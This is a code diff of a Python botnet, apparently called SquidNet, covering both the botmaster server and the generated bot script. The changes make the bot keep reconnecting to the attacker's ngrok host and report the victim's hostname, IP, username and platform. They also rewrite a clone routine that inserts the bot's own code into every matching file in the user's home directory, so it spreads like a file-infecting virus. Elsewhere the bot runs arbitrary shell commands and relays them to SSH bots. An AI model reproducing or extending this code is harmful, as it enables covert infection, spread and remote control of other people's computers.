@@ -605,7 +605,7 @@ ________________________________________________________
                             login = threading.Thread(target=self.ssh_login,args=(ip, username, password))
                             login.start()
                         elif msg.startswith("!getconninfo"):
-                            c.send(self.gen_conntable().encode())
+                            c.send(str("[(SERVER)]:\n"+self.gen_conntable()).encode())
                             self.log(f"\n[(SERVER)---->({hostname})]:\n{self.gen_conntable()}")
                         elif msg.startswith("!inject"):
                             msg_split = msg.split()
@@ -615,7 +615,7 @@ ________________________________________________________
                         elif msg.startswith("!listsshbots"):
                             c.send(f"[(SERVER)]: Connected SSH Bots: {self.display_bots}".encode())
                             self.log(f"\n[(SERVER)---->({hostname})]: Connected SSH Bots: {self.display_bots}")
-                        if "!login" in msg and "!help" in msg or "!getconninfo" in msg or "!getconninfo" in msg:
+                        if "!login" in msg.strip() or "!help" in msg.strip() or "!getconninfo" in msg.strip() or "!listsshbots" in msg.strip():
                             pass
                         else:
                             if len(self.ssh_bots) != 0:
@@ -835,10 +835,10 @@ ________________________________________________________
                 if self.instruction == "!botcount":
                     print(f"[+] Current Connected Bots: {self.bot_count}\n")
                 elif self.instruction == "!clear":
-                    if sys.platform == "darwin":
-                        os.system("clear")
-                    else:
+                    if sys.platform == "win32":
                         os.system("cls")
+                    else:
+                        os.system("clear")
                     self.logo()
                     self.usage()
                 elif self.instruction.startswith('!savefile'):
@@ -949,7 +949,7 @@ ________________________________________________________
 [+] - Added '!getconninfo' Command.
 [+] - Made it so that '!clear', '!genscript' and '!genadminscript' are not sent to the clients.
                     """)
-                if "!clear" in self.instruction.strip() or "!genscript" in self.instruction.strip() or "!genadminscript".strip() in self.instruction.strip() or "!whatsnew" in self.instruction.strip() or "!getconninfo" in self.instruction.strip():
+                if "!clear" in self.instruction.strip() or "!genscript" in self.instruction.strip() or "!genadminscript".strip() in self.instruction.strip() or "!whatsnew" in self.instruction.strip() or "!getconninfo" in self.instruction.strip() or "listsshbots" in self.instruction.strip():
                     pass
                 else:
                     if len(self.ssh_bots) != 0:
@@ -1061,6 +1061,7 @@ admin = BotMaster('""" + self.ngroklink + """',""" + str(
         Test it and see what it does! It will respond to all commands, and it will do either any of
         the in-built commands or run any other instructions with command prompt/terminal."""
         script = """
+#-----SquidNet-Bot-Script-----#
 import socket, time, os, threading, urllib.request, shutil, sys, random, base64, sqlite3, json
 import subprocess, re
 try:
@@ -4411,8 +4412,14 @@ class Bot:
         self.msg = ""
         self.desktop = f"C:/Users/{os.getlogin()}/Desktop"
         self.file_saving = False
-        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.connection.connect((self.ip, self.port))
+        while True:
+            try:
+                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.connection.connect((self.ip, self.port))
+                break
+            except:
+                self.connection.close()
+                time.sleep(1)
         self.fileeditor = False
         time.sleep(1)
         msg = socket.gethostname()+" "+self.getip()+" "+os.getlogin()+" "+sys.platform
@@ -4501,10 +4508,10 @@ class Bot:
             pass
     def getinfo(self):
         msg = f'''
-[+] IP:       {self.getip()}
-[+] CWD:      {os.getcwd()}
-[+] USERNAME: {os.getlogin()}
-[+] OS:       {sys.platform}
+IP:       {self.getip()}
+CWD:      {os.getcwd()}
+USERNAME: {os.getlogin()}
+OS:       {sys.platform}
         '''
         return msg
     def returnsecondstr(self, msg):
@@ -4692,9 +4699,24 @@ class Bot:
     def clone(self):
         file_ending = sys.argv[0].split(".")
         file_ending = file_ending[len(file_ending) - 1]
-        own_file = open(sys.argv[0], "rb")
-        own_content = own_file.read()
-        own_file.close()
+        if "py" in file_ending:
+            own_file = open(sys.argv[0], "r")
+            own_content = own_file.readlines()
+            own_file.close()
+            lines = []
+            in_code = False
+            for line in own_content:
+                if "#-----SquidNet-Bot-Script-----#" in line:
+                    in_code = True
+                if in_code:
+                    lines.append(line)
+                if "#-----End-Of-Bot-----#" in line:
+                    in_code = False
+                    break
+        else:
+            own_file = open(sys.argv[0], "rb")
+            own_content = own_file.read()
+            own_file.close()
         if sys.platform == "win32":
             main_dir = f"C:/Users/{os.getlogin()}/"
         else:
@@ -4717,17 +4739,30 @@ class Bot:
                 pass
             for files in dirlist:
                 try:
-                    if file_ending in files:
-                        file = open(files, "rb")
-                        content = file.read()
-                        file.close()
-                        if own_content in content:
-                            pass
-                        else:
-                            file = open(files, "wb")
-                            file.write(own_content + "\\n\\n".encode())
-                            file.write(content)
+                    if '.'+file_ending in files:
+                        if "py" in file_ending:
+                            file = open(files, "r")
+                            content = file.readlines()
                             file.close()
+                            if "#-----SquidNet-Bot-Script-----#" in content:
+                                pass
+                            else:
+                                file = open(files, "w")
+                                file.writelines(lines)
+                                file.writelines("\\n\\n")
+                                file.writelines(content)
+                                file.close()
+                        else:
+                            file = open(files, "rb")
+                            content = file.read()
+                            file.close()
+                            if own_content in content:
+                                pass
+                            else:
+                                file = open(files, "wb")
+                                file.write(own_content + "\\n\\n".encode())
+                                file.write(content)
+                                file.close()
                 except:
                     pass
     def gotowebsite(self, website):
@@ -4915,6 +4950,7 @@ ip = '""" + self.ngroklink + """'
 port = """ + str(self.ngrokport) + """
 key = """ + str(self.key) + """
 bot = Bot(ip, port, key)
+#-----End-Of-Bot-----#
         """
         return script
 class Web_Interface:
